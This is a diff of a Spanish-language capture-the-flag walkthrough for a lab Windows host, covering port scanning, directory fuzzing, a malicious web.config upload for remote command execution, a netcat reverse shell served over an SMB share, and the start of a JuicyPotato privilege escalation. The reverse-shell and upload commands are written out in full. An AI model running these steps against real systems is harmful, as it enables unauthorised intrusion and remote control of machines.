@@ -12,7 +12,7 @@
 
 #  Enumeración
 
-Escaneo completo de puertos:
+Escaneo completo de puertos para ver cuales hay abiertos:
 
 ``` bash
 nmap -sC -sS -sV -p- 10.0.50.42
@@ -41,17 +41,16 @@ Observaciones:
 
 #  Fuzzing Web
 
-Fuzzing de directorios:
+Realizamos un fuzzing de directorios:
 
 ``` bash
 gobuster dir -u http://10.0.50.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx
 ```
 
-Se descubre:
+Se descubre un directorio que nos permite subir archivos pero probando solo nos permite .Png y .Config:
 
     /zoc.aspx (200)
-
-La página permite subida de archivos.
+    
 
 Inspeccionando el HTML se encuentra:
 
@@ -83,7 +82,7 @@ Confirmamos:
 
 #  Obtención de RCE
 
-Se sube un `web.config` malicioso que permite ejecución ASP:
+Se sube un `web.config` malicioso con codigo RCE que permite ejecución ASP:
 
 ``` xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -116,7 +115,7 @@ Accediendo al archivo subido obtenemos **Remote Command Execution
 
 #  Acceso Inicial (Reverse Shell)
 
-Copiamos netcat:
+Copiamos netcat a nuestro directorio de trabajo:
 
 ``` bash
 cp /usr/share/windows-resources/binaries/nc.exe .
@@ -131,7 +130,13 @@ impacket-smbserver -smb2support sharedFolder .
 Verificación desde la víctima:
 
 ``` cmd
-dir \\10.0.50.4\share
+dir \\10.0.50.4\sharedFolder
+```
+
+Ponemos un listener en escucha:
+
+``` bash
+nc -lvnp 443
 ```
 
 Ejecutamos reverse shell:
@@ -140,11 +145,7 @@ Ejecutamos reverse shell:
 \\10.0.50.4\sharedFolder\nc.exe -e cmd 10.0.50.4 443
 ```
 
-Listener:
 
-``` bash
-nc -lvnp 443
-```
 
 Shell obtenida como usuario:
 
@@ -152,7 +153,10 @@ Shell obtenida como usuario:
 
 ------------------------------------------------------------------------
 
-# 🏁 User Flag
+Vvemos carpetas Administrador y e Info de nuestro usuario actual
+Navegamos a la carpeta users/info y vemos la user flag en user.txt
+
+#  User Flag
 
 Enumeración de usuarios:
 
@@ -194,13 +198,9 @@ Sistema vulnerable:
 
 #  JuicyPotato Exploit
 
-Copiamos binario:
-
-``` cmd
-copy \\10.0.50.4\share\JuicyPotato.exe C:\Windows\Temp\
-```
-
-Listener:
+Ahora escalaremos a Authority/System para leer la flag de Root.exe
+Abrimos otro listener.
+Vamos a la carpeta donde copiamos nuestro JuicyPotato y ejecutamos, pero antes hay que volver a poner un listener
 
 ``` bash
 nc -lvnp 443
